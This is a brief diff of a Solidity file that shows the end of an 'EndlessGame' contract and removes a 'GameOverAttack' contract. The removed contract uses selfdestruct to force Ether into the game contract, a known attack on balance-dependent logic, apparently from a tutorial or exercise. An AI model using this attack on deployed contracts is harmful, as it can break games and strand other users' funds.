@@ -19,14 +19,3 @@ contract EndlessGame {
     require(sent, "Failed to send Ether");
   }
 }
-
-contract GameOverAttack {
-  EndlessGame endlessGame;
-  constructor (EndlessGame _endlessGame) public {
-    endlessGame = EndlessGame(_endlessGame);
-  }
-  function attack() public payable {
-    address payable addr = payable(address(endlessGame));
-    selfdestruct(addr);
-  }
-}
